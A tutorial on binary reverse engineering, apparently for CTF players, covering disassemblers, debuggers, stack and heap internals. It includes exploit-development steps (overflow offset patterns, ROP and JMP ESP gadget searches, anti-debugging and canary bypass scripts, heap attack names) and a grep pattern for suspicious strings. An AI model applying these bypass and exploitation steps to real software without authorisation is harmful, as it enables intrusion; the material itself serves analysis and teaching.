#### Output Formatting

**Structured Output:**

bash

```bash
# JSON format (manual construction)
strings -t x binary_sample | awk '{printf "{\"offset\":\"%s\",\"string\":\"%s\"}\n", $1, substr($0,index($0,$2))}'

# CSV format
strings -t x binary_sample | awk '{printf "%s,\"%s\"\n", $1, substr($0,index($0,$2))}' > strings.csv
```

**Color-Coded Output:**

bash

```bash
# Highlight suspicious patterns
strings binary_sample | grep --color=always -E "(password|http|exec|cmd|powershell|eval)"
```

---

### Disassembly (IDA Pro, Ghidra, radare2, objdump)

Disassembly translates machine code to human-readable assembly language, revealing program logic, control flow, function calls, and vulnerability points. Different tools offer varying levels of automation, analysis depth, and platform support.

#### objdump (Basic Disassembly)

**Simple Disassembly:**

bash

```bash
# Disassemble all executable sections
objdump -d binary_sample

# Include source code (if debug symbols present)
objdump -S binary_sample

# Disassemble specific section
objdump -d -j .text binary_sample

# Intel syntax (more readable)
objdump -d -M intel binary_sample
```

**Comprehensive Analysis:**

bash

```bash
# Full headers and disassembly
objdump -x -d binary_sample > full_analysis.txt

# Symbol table
objdump -t binary_sample

# Dynamic symbol table
objdump -T binary_sample

# Relocation entries
objdump -r binary_sample
```

**Targeted Disassembly:**

bash

```bash
# Disassemble specific function
objdump -d binary_sample | grep -A 50 "<main>:"

# Disassemble address range
objdump -d --start-address=0x400000 --stop-address=0x400100 binary_sample

# Show raw bytes with disassembly
objdump -d -M intel --no-show-raw-insn binary_sample
```

**Windows PE Disassembly:**

bash

```bash
# Disassemble PE file (requires mingw binutils)
x86_64-w64-mingw32-objdump -d -M intel windows_binary.exe

# Alternative: use objdump with wine
objdump -d -M intel windows_binary.exe
```

#### radare2 (Interactive Disassembler)

**Basic radare2 Usage:**

bash

```bash
# Open binary in radare2
r2 binary_sample

# Analyze binary automatically
r2 -A binary_sample

# Open in write mode
r2 -w binary_sample

# Debug mode
r2 -d binary_sample
```

**Essential radare2 Commands:**

bash

```bash
# Within r2 prompt:

# Analyze all
aaa

# List functions
afl

# Disassemble function
pdf @ main
pdf @ sym.suspicious_function

# Disassemble at address
pd 20 @ 0x400500

# Visual mode
V

# Visual graph mode
VV

# Seek to function
s main
s sym.check_password
```

**Function Analysis:**

bash

```bash
# Function information
afi @ main

# Function arguments
afa @ main

# Cross-references to function
axt @ sym.strcpy

# Cross-references from function
axf @ main

# Call graph
agc
```

**Advanced radare2 Features:**

bash

```bash
# String analysis
iz          # Strings in data sections
izz         # All strings including code

# Imports/Exports
ii          # Imports
iE          # Exports

# Binary information
i           # File info
iI          # Binary info
iS          # Sections
iM          # Memory maps

# Code emulation
aei         # Initialize ESIL VM
aeim        # Initialize ESIL memory
aecu [addr] # Continue until address
```

**radare2 Scripting:**

bash

```bash
# Run r2 script
r2 -i analysis_script.r2 binary_sample

# Example script (analysis_script.r2):
aaa
afl
pdf @ main
s main
pdf > main_disasm.txt
q
```

**Visual Mode Navigation:**

```
V     # Enter visual mode
p/P   # Cycle through views
:     # Command mode
?     # Help
q     # Quit visual mode
```

#### Ghidra (NSA's Reverse Engineering Suite)

**Ghidra Headless Analysis:**

bash

```bash
# Analyze binary headlessly
analyzeHeadless /project_location project_name -import binary_sample -postScript analyze_script.py

# Export disassembly
analyzeHeadless /tmp/ghidra_project Test -import binary_sample -postScript ExportDisassembly.py
```

**Ghidra GUI Workflow:**

```
1. Create new project: File → New Project
2. Import binary: File → Import File
3. Analyze: Analysis → Auto Analyze
4. View disassembly: Window → Listing
5. Decompile: Window → Decompile
```

**Ghidra Decompiler (C-like Pseudocode):**

```
Double-click function in Symbol Tree or Function Graph
Decompiler window shows C-like pseudocode
Right-click → Edit Function Signature for manual corrections
```

**[Unverified]** Ghidra's decompiler produces more readable pseudocode than IDA Pro's in some cases, particularly for complex control flow, though comparative quality depends on binary characteristics and optimization levels.

**Ghidra Scripting (Python):**

python

```python
# Example Ghidra script (ghidra_analyze.py)
from ghidra.program.model.listing import CodeUnit

# Get current program
program = getCurrentProgram()
listing = program.getListing()

# Iterate functions
fm = program.getFunctionManager()
for func in fm.getFunctions(True):
    print("Function: {} at {}".format(func.getName(), func.getEntryPoint()))
    
    # Get instructions
    insn_iter = listing.getInstructions(func.getBody(), True)
    for insn in insn_iter:
        if "call" in insn.getMnemonicString():
            print("  Call at: {}".format(insn.getAddress()))
```

**Ghidra Batch Processing:**

bash

```bash
# Process multiple binaries
for binary in /malware_samples/*; do
    analyzeHeadless /tmp/ghidra Batch -import "$binary" -postScript AutoAnalyze.py
done
```

#### IDA Pro (Industry Standard)

**IDA Command Line:**

bash

```bash
# IDA Pro (commercial)
idaq64 binary_sample

# IDA Free
idaq64 -A binary_sample  # Auto-analysis

# Generate database
idaq64 -B binary_sample

# Batch mode (no GUI)
idaq64 -A -Sbatch_script.idc binary_sample
```

**IDA Shortcuts and Navigation:**

```
G       # Jump to address
X       # Cross-references to
Ctrl+X  # Cross-references from
N       # Rename symbol
;       # Add comment
:       # Add repeatable comment
Space   # Toggle graph/text view
F5      # Decompile (HexRays)
```

**IDAPython Scripting:**

python

```python
# Example IDA Python script
import idaapi
import idautils
import idc

# Iterate through functions
for func_ea in idautils.Functions():
    func_name = idc.get_func_name(func_ea)
    print(f"Function: {func_name} at {hex(func_ea)}")
    
    # Find dangerous functions
    if "strcpy" in func_name or "sprintf" in func_name:
        print(f"  [!] Potentially dangerous: {func_name}")
    
    # Get function instructions
    for head in idautils.Heads(func_ea, idc.get_func_attr(func_ea, FUNCATTR_END)):
        mnem = idc.print_insn_mnem(head)
        if mnem == "call":
            target = idc.get_operand_value(head, 0)
            target_name = idc.get_func_name(target)
            print(f"  Call to: {target_name}")
```

**IDA Hex-Rays Decompiler:**

python

```python
# Decompile function programmatically
import idaapi

func_ea = here()  # Current address
cfunc = idaapi.decompile(func_ea)
print(str(cfunc))  # Print pseudocode
```

**IDA Plugins:**

```
Common plugins:
- findcrypt: Identify cryptographic constants
- FLIRT: Function Library Identification
- BinDiff: Binary diffing
- Diaphora: Binary diffing and porting
- ret-sync: Synchronize with debugger

Plugin installation:
Copy .py/.plw files to: <IDA_DIR>/plugins/
```

#### Comparative Tool Selection

**Tool Capabilities:**

**objdump:**

- Lightweight, command-line
- No advanced analysis
- Good for quick inspection
- Cross-platform support

**radare2:**

- Free and open source
- Powerful command-line interface
- Steep learning curve
- Extensive scripting capabilities
- Binary patching support

**Ghidra:**

- Free, NSA-developed
- Excellent decompiler
- Good for team collaboration (server mode)
- Cross-platform (Java-based)
- Slower than IDA Pro

**IDA Pro:**

- Industry standard (commercial)
- Best disassembler accuracy
- HexRays decompiler (separate purchase)
- Extensive plugin ecosystem
- IDA Free version available (limited features)

**[Inference]** For CTF scenarios, Ghidra offers the best balance of capabilities and cost, while radare2 excels in automation and scripting contexts.

#### Architecture-Specific Disassembly

**ARM Binaries:**

bash

```bash
# objdump for ARM
arm-linux-gnueabi-objdump -d -M force-thumb arm_binary

# radare2 ARM
r2 -a arm -b 32 arm_binary
```

**MIPS Binaries:**

bash

```bash
# objdump for MIPS
mips-linux-gnu-objdump -d mips_binary

# radare2 MIPS
r2 -a mips -b 32 mips_binary
```

**x86 vs x86_64:**

bash

```bash
# Force architecture in radare2
r2 -a x86 -b 32 binary_32bit
r2 -a x86 -b 64 binary_64bit
```

#### Control Flow Analysis

**Graphing Call Trees:**

bash

```bash
# radare2 call graph
r2 -A binary_sample -q -c 'agC' > callgraph.dot
dot -Tpng callgraph.dot -o callgraph.png

# Function cross-references
r2 -A binary_sample -q -c 'axt @ sym.main'
```

**Ghidra Function Graph:**

```
Right-click function → Display Function Graph
Window → Function Call Graph (entire program)
```

**IDA Pro Flow Charts:**

```
View → Open subviews → Flow chart
View → Graphs → Flow chart
```

#### Binary Diffing

**radare2 Diff:**

bash

```bash
# Compare two binaries
radiff2 binary1 binary2

# Unified diff
radiff2 -u binary1 binary2

# Hexadecimal diff
radiff2 -x binary1 binary2
```

**BinDiff (IDA Plugin):**

```
File → BinDiff → Diff Database...
Select two IDA databases
Analyze differences
```

**Diaphora (Open Source Alternative):**

python

```python
# Within IDA with Diaphora plugin
Alt+7 to open Diaphora
Select databases to compare
Run diff analysis
```

---

### Debugging (gdb, lldb, Immunity Debugger, x64dbg)

Debugging allows dynamic analysis through controlled execution, breakpoint management, memory inspection, and runtime manipulation. Debuggers reveal behavior invisible in static analysis, including unpacking routines, anti-analysis checks, and runtime decryption.

#### GDB (GNU Debugger)

**Basic GDB Usage:**

bash

```bash
# Start GDB with binary
gdb binary_sample

# Start with arguments
gdb --args binary_sample arg1 arg2

# Attach to running process
gdb -p <PID>

# Enable core dumps
gdb binary_sample core_dump
```

**Essential GDB Commands:**

gdb

```gdb
# Run program
run
run arg1 arg2

# Set breakpoints
break main
break *0x400500
break function_name
break file.c:42

# Conditional breakpoint
break main if argc == 2

# List breakpoints
info breakpoints

# Delete breakpoint
delete 1
```

**Execution Control:**

gdb

```gdb
# Continue execution
continue (c)

# Step through instructions
stepi (si)

# Step over function calls
nexti (ni)

# Step into functions (source level)
step (s)

# Step over functions (source level)
next (n)

# Finish current function
finish

# Execute until address
until *0x400600
```

**Memory and Register Inspection:**

gdb

```gdb
# Display registers
info registers (i r)
info all-registers

# Display specific register
print $rax
print /x $rsp

# Examine memory
x/10x $rsp          # 10 hex words at stack pointer
x/10i $rip          # 10 instructions at instruction pointer
x/s 0x400800        # String at address
x/20xb 0x600000     # 20 bytes in hex

# Memory format specifiers:
# x: hex, d: decimal, s: string, i: instruction
# b: byte, h: halfword, w: word, g: giant (8 bytes)
```

**Stack Analysis:**

gdb

```gdb
# Backtrace (call stack)
backtrace (bt)
bt full            # Include local variables

# Select frame
frame 2
up
down

# Frame information
info frame
info args          # Function arguments
info locals        # Local variables
```

**Watchpoints (Data Breakpoints):**

gdb

```gdb
# Watch variable
watch variable_name

# Watch memory address
watch *0x600800

# Watch for specific condition
watch variable_name if variable_name > 100

# Read watchpoint (break on read)
rwatch *0x600800

# Access watchpoint (break on read/write)
awatch *0x600800

# List watchpoints
info watchpoints
```

#### GDB with PEDA/GEF/Pwndbg

**PEDA (Python Exploit Development Assistance):**

bash

```bash
# Install PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# PEDA commands
gdb-peda$ checksec           # Check binary protections
gdb-peda$ pattern create 200 # Create cyclic pattern
gdb-peda$ pattern offset 0x41414141
gdb-peda$ ropgadget          # Find ROP gadgets
gdb-peda$ shellcode generate x86/linux exec
```

**GEF (GDB Enhanced Features):**

bash

```bash
# Install GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# GEF commands
gef➤ vmmap              # Memory mapping
gef➤ heap chunks        # Heap chunk analysis
gef➤ search-pattern "/bin/sh"
gef➤ xinfo 0x400000    # Detailed address info
gef➤ telescope $rsp 20 # Memory telescope view
```

**pwndbg:**

bash

```bash
# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# pwndbg commands
pwndbg> cyclic 200          # Generate cyclic pattern
pwndbg> cyclic -l 0x61616171
pwndbg> vmmap               # Virtual memory map
pwndbg> canary              # Display stack canary
pwndbg> procinfo            # Process information
```

#### Advanced GDB Techniques

**Automated Debugging Scripts:**

gdb

```gdb
# Script file (script.gdb)
break main
run
info registers
x/20i $rip
continue
quit

# Execute script
gdb -x script.gdb binary_sample
```

**Python Scripting in GDB:**

python

```python
# gdb_script.py
import gdb

class CustomBreakpoint(gdb.Breakpoint):
    def __init__(self, location):
        super().__init__(location)
        
    def stop(self):
        rax = gdb.parse_and_eval("$rax")
        print(f"RAX value: {rax}")
        if int(rax) == 0x1337:
            print("Target value reached!")
            return True
        return False

# Set breakpoint
CustomBreakpoint("*0x400500")
gdb.execute("run")
```

bash

```bash
# Load Python script
gdb -x gdb_script.py binary_sample
```

**Conditional Logging:**

gdb

```gdb
# Set breakpoint with commands
break malloc
commands
  silent
  printf "malloc(%d) called\n", $rdi continue end

# Log all function calls

catch syscall commands silent printf "Syscall: %s\n", $_siginfo continue end

````

**Memory Dumping:**
```gdb
# Dump memory region to file
dump binary memory output.bin 0x400000 0x401000

# Dump entire heap
info proc mappings
dump binary memory heap.bin 0x<heap_start> 0x<heap_end>

# Dump loaded libraries
info sharedlibrary
dump binary memory libc.bin 0x<libc_base> 0x<libc_end>
````

#### GDB Anti-Debugging Bypass

**Detect and Bypass ptrace Check:**

gdb

```gdb
# Catch ptrace syscall
catch syscall ptrace
commands
  set $rax = 0
  continue
end

# Alternative: modify return value after call
break ptrace
commands
  finish
  set $rax = 0
  continue
end
```

**Timing Attack Bypass:**

gdb

```gdb
# Hook rdtsc instruction (x86)
break *0x400550  # Address of rdtsc
commands
  set $rax = 0
  set $rdx = 0
  jump *0x400552  # Skip rdtsc
end
```

**Process Name Check Bypass:**

python

```python
# GDB Python script to modify argv[0]
import gdb

# Modify process name in memory
def modify_argv():
    argv_addr = gdb.parse_and_eval("*(char **)($rsp + 8)")
    fake_name = b"legitimate_process\x00"
    gdb.selected_inferior().write_memory(argv_addr, fake_name)

# Call at program start
gdb.events.stop.connect(lambda x: modify_argv())
```

#### LLDB (LLVM Debugger)

**Basic LLDB Usage:**

bash

```bash
# Start LLDB
lldb binary_sample

# Run with arguments
lldb -- binary_sample arg1 arg2

# Attach to process
lldb -p <PID>
```

**LLDB Commands (GDB Equivalents):**

lldb

```lldb
# Run program
(lldb) run
(lldb) r arg1 arg2

# Breakpoints
(lldb) breakpoint set --name main
(lldb) b main
(lldb) breakpoint set --address 0x400500
(lldb) b 0x400500

# List breakpoints
(lldb) breakpoint list
(lldb) br l

# Delete breakpoint
(lldb) breakpoint delete 1
```

**Execution Control:**

lldb

```lldb
# Continue
(lldb) continue
(lldb) c

# Step instruction
(lldb) thread step-inst
(lldb) si

# Step over
(lldb) thread step-inst-over
(lldb) ni

# Step into function
(lldb) thread step-in
(lldb) s

# Step over function
(lldb) thread step-over
(lldb) n
```

**Memory and Registers:**

lldb

```lldb
# Display registers
(lldb) register read
(lldb) re r

# Display specific register
(lldb) register read rax
(lldb) re r rax

# Modify register
(lldb) register write rax 0x1337

# Examine memory
(lldb) memory read 0x400000
(lldb) x 0x400000

# Read as instructions
(lldb) disassemble --start-address 0x400000 --count 10

# Read as string
(lldb) memory read --format s 0x400800
```

**LLDB Stack Analysis:**

lldb

```lldb
# Backtrace
(lldb) thread backtrace
(lldb) bt

# Frame information
(lldb) frame info
(lldb) frame variable  # Local variables

# Select frame
(lldb) frame select 2
(lldb) f 2
```

**LLDB Scripting (Python):**

python

```python
# lldb_script.py
import lldb

def custom_command(debugger, command, result, internal_dict):
    target = debugger.GetSelectedTarget()
    process = target.GetProcess()
    thread = process.GetSelectedThread()
    frame = thread.GetSelectedFrame()
    
    # Read register
    rax = frame.FindRegister("rax").GetValueAsUnsigned()
    print(f"RAX: {hex(rax)}")

# Register command
def __lldb_init_module(debugger, internal_dict):
    debugger.HandleCommand('command script add -f lldb_script.custom_command custom')
```

bash

```bash
# Load script in LLDB
(lldb) command script import lldb_script.py
(lldb) custom
```

#### Immunity Debugger (Windows)

**Basic Immunity Usage:**

```
File → Open → Select executable
F9: Run
F2: Set breakpoint at current address
F7: Step into
F8: Step over
Ctrl+F9: Execute until return
```

**Common Immunity Commands:**

```
# Search for instructions
Right-click in CPU window → Search for → Command
Example: JMP ESP, CALL EAX

# Search for strings
Right-click in CPU window → Search for → All referenced text strings

# View modules
View → Executable modules (Alt+E)

# View memory map
View → Memory (Alt+M)
```

**Immunity Python Scripting (PyCommands):**

python

```python
# Example: find_jmp_esp.py
import immlib
import immutils

def main(args):
    imm = immlib.Debugger()
    search = imm.search(imm.assemble("JMP ESP"))
    
    for hit in search:
        imm.log(f"JMP ESP found at: {hex(hit)}")
    
    return "Search complete"
```

**Mona.py Plugin (Essential for Exploit Development):**

python

```python
# Within Immunity Debugger command line

# Find JMP ESP gadgets
!mona jmp -r esp

# Generate cyclic pattern
!mona pattern_create 1000

# Find pattern offset
!mona pattern_offset 0x41414141

# Find ROP gadgets
!mona rop

# Search for bad characters
!mona bytearray -cpb "\x00\x0a\x0d"

# Compare memory with bytearray
!mona compare -f C:\bytearray.bin -a <ESP_address>

# Check security protections
!mona modules

# Find all executable memory
!mona find -type instr -s "jmp esp" -m module.dll
```

**[Inference]** Mona.py is considered the most comprehensive exploit development plugin for Windows debuggers, providing automated ROP chain generation and bad character detection critical for buffer overflow exploitation.

#### x64dbg (Modern Windows Debugger)

**Basic x64dbg Usage:**

```
File → Open → Select executable
F9: Run
F2: Toggle breakpoint
F7: Step into
F8: Step over
F4: Run to selection
Ctrl+F9: Execute until return
```

**x64dbg Interface Components:**

```
CPU Tab: Disassembly view
Dump Tab: Memory hex dump
Stack Tab: Stack view
Registers: Register values
Symbols: Loaded symbols and modules
Memory Map: Virtual memory layout
```

**x64dbg Commands:**

```
# Command bar (bottom of window)

# Set breakpoint
bp 0x401000
bp CreateFileA

# Hardware breakpoint
bph 0x401000

# Memory breakpoint
bpm 0x600000, r  # Break on read
bpm 0x600000, w  # Break on write
bpm 0x600000, x  # Break on execute

# Search pattern
find 0x400000, "\x55\x8B\xEC"

# Assemble
assemble 0x401000, "nop"

# Modify memory
setmem 0x401000, 90  # Write NOP

# Dump memory
dump 0x400000

# Follow in dump
disasm 0x401000
```

**x64dbg Scripting:**

```
# Script commands (.txt file)
bp CreateFileA
run
log "{s:rax}"
bc CreateFileA
run

# Load script
File → Load Script
```

**x64dbg Plugins:**

```
Common plugins:
- xAnalyzer: Automated analysis
- Scylla: Import reconstruction
- OllyDumpEx: Process dumping
- x64dbgpy: Python scripting
- ret-sync: Sync with IDA/Ghidra

Plugin directory: <x64dbg>/plugins/
```

**x64dbg Python Plugin (x64dbgpy):**

python

```python
# x64dbg Python script
import x64dbgpy.pluginsdk as x64dbg

# Get register value
rax = x64dbg.register.GetRAX()
print(f"RAX: {hex(rax)}")

# Set breakpoint
bp_address = 0x401000
x64dbg.debug.SetBreakpoint(bp_address)

# Read memory
data = x64dbg.memory.Read(0x400000, 100)
print(data.hex())

# Write memory
x64dbg.memory.Write(0x401000, b"\x90\x90\x90")
```

#### Anti-Debugging Detection and Bypass

**Common Anti-Debug Techniques:**

**IsDebuggerPresent:**

gdb

```gdb
# GDB bypass
break IsDebuggerPresent
commands
  set $rax = 0
  return 0
  continue
end
```

```
# x64dbg bypass
bp IsDebuggerPresent
eax = 0
run
```

**PEB BeingDebugged Flag:**

gdb

```gdb
# GDB: Patch PEB flag
break main
commands
  # x64: fs:0x60 + 0x2
  set {char}($fs_base + 0x60 + 0x2) = 0
  continue
end
```

python

```python
# x64dbg script
bp main
peb = [fs:0x60]
setmem [peb+2], 0
bc main
run
```

**NtQueryInformationProcess:**

gdb

```gdb
break NtQueryInformationProcess
commands
  finish
  # ProcessDebugPort = 0
  set *(int*)$rsi = 0
  continue
end
```

**Hardware Breakpoint Detection:**

gdb

```gdb
# Clear debug registers
break main
commands
  set $dr0 = 0
  set $dr1 = 0
  set $dr2 = 0
  set $dr3 = 0
  set $dr6 = 0
  set $dr7 = 0
  continue
end
```

**Timing Checks (RDTSC):**

python

```python
# x64dbg Python: Hook RDTSC
import x64dbgpy.pluginsdk as x64dbg

class RDTSCHook:
    def __init__(self):
        self.last_tsc = 0
        
    def hook(self):
        # Find all RDTSC instructions
        module_base = x64dbg.module.BaseFromName("binary.exe")
        module_size = x64dbg.module.SizeFromAddr(module_base)
        
        # Search for RDTSC opcode (0F 31)
        rdtsc_pattern = b"\x0F\x31"
        hits = x64dbg.pattern.Find(module_base, module_size, rdtsc_pattern)
        
        for hit in hits:
            # Set breakpoint
            x64dbg.debug.SetBreakpoint(hit)
```

#### Process Hollowing and Injection Analysis

**Detect Process Injection:**

gdb

```gdb
# Monitor VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
break VirtualAllocEx
break WriteProcessMemory
break CreateRemoteThread
commands
  info registers
  x/10gx $rsp
  backtrace
  continue
end
```

**Dump Injected Memory:**

gdb

```gdb
# After WriteProcessMemory call
break WriteProcessMemory
commands
  finish
  set $addr = $rax
  set $size = $rdx
  dump binary memory injected.bin $addr ($addr + $size)
  continue
end
```

**x64dbg Process Hollowing Detection:**

```
# Monitor API calls
bp NtUnmapViewOfSection
bp VirtualAllocEx
bp WriteProcessMemory
bp SetThreadContext
bp ResumeThread

# Log parameters at each breakpoint
# Dump memory regions written by WriteProcessMemory
```

#### Unpacking Analysis

**Generic Unpacker Detection:**

gdb

```gdb
# Set breakpoint on entry point
info files
break *<entry_point>

# Monitor memory allocations
break VirtualAlloc
break VirtualProtect
commands
  printf "VirtualAlloc/Protect at RIP: %p\n", $rip
  printf "Address: %p, Size: %d\n", $rcx, $rdx
  continue
end

# Set breakpoint on new executable memory
break VirtualProtect
commands
  if ($r8 & 0x20) == 0x20  # PAGE_EXECUTE_READ
    printf "New executable region: %p\n", $rcx
    break *$rcx
  end
  continue
end
```

**OEP (Original Entry Point) Finding:**

gdb

```gdb
# Step through until reaching unpacked code
si 10000  # Step large number of instructions

# Look for characteristic patterns
x/100i $rip  # Check if normal code or packer stub
```

**x64dbg Unpacking:**

```
# Trace into packer
F7 repeatedly until reaching unpacked code

# Use trace plugin
Plugins → Trace → Trace Into/Over
Set trace depth and condition
Analyze trace log for transition to unpacked code

# Memory breakpoint on stack
Follow ESP in dump
Right-click → Breakpoint → Memory Access → Execute
Run - will break when unpacked code executes from stack
```

#### Comparative Debugger Selection

**GDB:**

- Linux native debugging
- Powerful scripting (Python, GDB commands)
- Remote debugging support
- Best for server-side exploitation

**LLDB:**

- macOS/iOS native debugging
- Modern architecture
- Better performance than GDB on macOS
- Improved C++ debugging

**Immunity Debugger:**

- Windows exploitation focus
- Excellent Mona.py plugin
- Python 2.x based (legacy)
- Good for 32-bit analysis

**x64dbg:**

- Modern Windows debugging
- Active development
- 64-bit native support
- Better plugin ecosystem than Immunity
- Recommended for Windows CTF challenges

**[Inference]** x64dbg has largely replaced Immunity Debugger in modern Windows exploitation workflows due to 64-bit support and active maintenance, though Immunity remains valuable for 32-bit legacy analysis.

---

### Important Related Subtopics

For comprehensive binary analysis coverage, investigate:

- **Symbolic execution** (angr, KLEE for automated path exploration)
- **Dynamic instrumentation** (PIN, DynamoDB, Frida for runtime code modification)
- **Malware packing/unpacking** (UPX, Themida, VMProtect analysis techniques)
- **Binary instrumentation frameworks** (Intel PT, DTrace for detailed execution tracing)
- **Firmware analysis** (binwalk, firmware-mod-kit for embedded system reverse engineering)

---

### Stack Analysis

**Stack Fundamentals**

The stack is a LIFO (Last In, First Out) memory structure used for:

- Function call management
- Local variable storage
- Return addresses
- Function parameters
- Saved register states

**Stack Frame Structure**

```
High Memory Addresses
+------------------+
| Function Args    |  (pushed right-to-left in x86)
+------------------+
| Return Address   |  (EIP/RIP saved here)
+------------------+
| Saved EBP/RBP    |  <- EBP/RBP points here (frame pointer)
+------------------+
| Local Variables  |
+------------------+
| Saved Registers  |
+------------------+  <- ESP/RSP points here (stack pointer)
Low Memory Addresses
```

**Key Registers for Stack Analysis**

**x86 (32-bit)**

- `ESP` (Stack Pointer): Points to top of stack
- `EBP` (Base Pointer): Points to base of current stack frame
- `EIP` (Instruction Pointer): Points to next instruction

**x86_64 (64-bit)**

- `RSP` (Stack Pointer): 64-bit stack pointer
- `RBP` (Base Pointer): 64-bit frame pointer
- `RIP` (Instruction Pointer): 64-bit instruction pointer

**Stack Analysis with GDB**

```bash
# Launch binary in GDB
gdb ./binary

# Set breakpoint
break main
break *0x08048450

# Run program
run

# Examine stack
x/20wx $esp          # View 20 words in hex from ESP
x/20gx $rsp          # View 20 giant words (64-bit) from RSP

# View stack frame
info frame
info locals
info args

# Examine specific addresses
x/s 0xbffff7a0       # View as string
x/i 0x08048450       # View as instruction
x/4wx $ebp-0x10      # View 4 words at EBP-16

# Stack backtrace
backtrace
bt full              # With local variables
```

**Stack Analysis with radare2**

```bash
# Open binary
r2 -d ./binary

# Analyze all
aaa

# Set breakpoint
db main

# Run to breakpoint
dc

# View stack
pxw @ rsp            # Print hex words at RSP
pxq @ rsp            # Print hex qwords (64-bit)
px 100 @ rsp         # Print 100 bytes from RSP

# Visual mode stack view
V
p                    # Cycle views to stack view

# Stack frame analysis
afvd                 # Display local variables
afvr                 # Display register-based args
```

**Identifying Stack-Based Buffer Overflows**

```bash
# Pattern creation for overflow analysis
msf-pattern_create -l 500

# In GDB, after crash
x/wx $esp            # View value at ESP
msf-pattern_offset -q <VALUE>  # Find offset

# Alternative with pwntools
python3 -c "from pwn import *; print(cyclic(500))"
python3 -c "from pwn import *; print(cyclic_find(0x61616169))"
```

**Stack Canaries Detection**

[Inference] Stack canaries are values placed before the return address to detect buffer overflows:

```bash
# Check for stack protection
checksec --file=./binary

# In GDB, look for canary checks
disassemble function_name
# Look for: __stack_chk_fail calls
# Look for: gs:0x14 or gs:0x28 references (x86/x64)

# In radare2
i~canary             # Check binary info for canary
```

**Stack Pivot Analysis**

Stack pivoting redirects execution by moving the stack pointer:

```bash
# In GDB, watch ESP/RSP changes
watch $esp
watch $rsp

# Common pivot gadgets (ROPgadget)
ROPgadget --binary ./binary | grep "xchg.*esp"
ROPgadget --binary ./binary | grep "leave ; ret"
```

**Stack Cookie/Canary Bypass Techniques**

[Unverified] These techniques may not work against modern implementations:

1. **Leak canary value**: Read stack memory to discover canary
2. **Brute force**: Try all possible canary values (32-bit only)
3. **Overwrite with original**: If you can read and write, preserve canary
4. **Fork-based brute force**: Exploit fork() preserving canary across attempts

### Heap Analysis

**Heap Memory Management**

The heap provides dynamic memory allocation with functions like `malloc()`, `calloc()`, `realloc()`, and `free()`.

**Heap Allocators**

- **ptmalloc2**: Default Linux allocator (glibc)
- **jemalloc**: Used by Firefox, FreeBSD
- **tcmalloc**: Google's Thread-Caching Malloc
- **Windows Heap**: NT Heap, Low Fragmentation Heap (LFH)

**Heap Chunk Structure (ptmalloc2)**

```
Allocated Chunk:
+------------------+
| prev_size        |  (if previous chunk is free)
+------------------+
| size | flags     |  (size includes metadata, flags: P/M/N)
+------------------+
| user data        |
|                  |
+------------------+

Free Chunk:
+------------------+
| prev_size        |
+------------------+
| size | flags     |
+------------------+
| fd (forward)     |  <- Pointer to next free chunk
+------------------+
| bk (backward)    |  <- Pointer to previous free chunk
+------------------+
| user data        |
+------------------+
```

**Heap Analysis with GDB and pwndbg**

```bash
# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Launch with pwndbg
gdb ./binary

# Heap commands
heap                 # Overview of heap
heap chunks          # List all chunks
heap bins            # Show bin states
arena                # Show arena information

# Examine specific chunk
x/20wx <address>

# Track allocations
heap trace
```

**Heap Analysis with GDB and GEF**

```bash
# Install GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Heap commands
heap chunks          # List chunks
heap bins            # Show bins
heap arenas          # Show all arenas

# Visual heap
heap view
```

**Heap Vulnerability Types**

**Use-After-Free (UAF)**

```c
// Vulnerable pattern
char *ptr = malloc(100);
free(ptr);
// ptr still points to freed memory
strcpy(ptr, "data");  // Use after free
```

Detection in GDB:

```bash
# Set watchpoint on freed memory
watch *0x<freed_address>

# Look for references to freed addresses
find 0x<heap_start>, 0x<heap_end>, 0x<freed_address>
```

**Double Free**

```c
// Vulnerable pattern
char *ptr = malloc(100);
free(ptr);
free(ptr);  // Double free
```

Detection:

```bash
# Enable malloc checking
export MALLOC_CHECK_=3
./binary

# In GDB, break on free
break free
commands
  info args
  backtrace
  continue
end
```

**Heap Overflow**

```c
// Vulnerable pattern
char *ptr = malloc(32);
strcpy(ptr, long_string);  // Overflows into next chunk
```

**Fastbin Analysis**

Fastbins are single-linked lists for small allocations (16-80 bytes on x64):

```bash
# In pwndbg
fastbins

# Manual inspection
x/20gx &main_arena
# Fastbins are at known offsets from main_arena
```

**Tcache Analysis (glibc 2.26+)**

```bash
# In pwndbg
tcache
tcachebins

# View tcache structure
x/100gx <tcache_perthread_struct_address>
```

**Unsorted/Small/Large Bins**

These are doubly-linked lists for larger allocations:

```bash
# In pwndbg/GEF
bins
unsortedbin
smallbins
largebins
```

**Heap Exploitation Techniques**

[Unverified] Modern heap protections may prevent these techniques:

1. **Fastbin dup**: Double free in fastbin to get overlapping allocations
2. **Tcache poisoning**: Overwrite tcache fd pointer
3. **Unsorted bin attack**: Overwrite arbitrary memory using unsorted bin
4. **House of Force**: Overflow top chunk size
5. **House of Spirit**: Free fake chunk on stack

**Heap Analysis Tools**

```bash
# Valgrind for memory errors
valgrind --leak-check=full ./binary

# Address Sanitizer (compile-time)
gcc -fsanitize=address -g program.c -o program

# ltrace to track malloc/free
ltrace -e malloc+free-@ ./binary
```

### Function Calls and Imports

**Calling Conventions**

**x86 (32-bit) Conventions**

**cdecl** (C default):

- Arguments pushed right-to-left on stack
- Caller cleans up stack
- Return value in EAX

```asm
push arg3
push arg2
push arg1
call function
add esp, 12        ; Caller cleanup
```

**stdcall** (Windows API):

- Arguments pushed right-to-left
- Callee cleans up stack
- Return value in EAX

**fastcall**:

- First two args in ECX, EDX
- Rest on stack
- Callee cleanup

**x86_64 Calling Conventions**

**System V AMD64 ABI** (Linux/Unix):

- Args: RDI, RSI, RDX, RCX, R8, R9, then stack
- Return value: RAX
- Floating point: XMM0-XMM7

**Microsoft x64** (Windows):

- Args: RCX, RDX, R8, R9, then stack
- Return value: RAX
- Shadow space: 32 bytes reserved on stack

**Identifying Calling Convention**

```bash
# In GDB
disassemble function_name

# Look for:
# - How arguments are passed (registers vs stack)
# - Who cleans stack (add esp/rsp after call)
# - Prologue/epilogue patterns
```

**Function Prologue and Epilogue**

**Standard Prologue**:

```asm
push ebp
mov ebp, esp
sub esp, <local_vars_size>
```

**Standard Epilogue**:
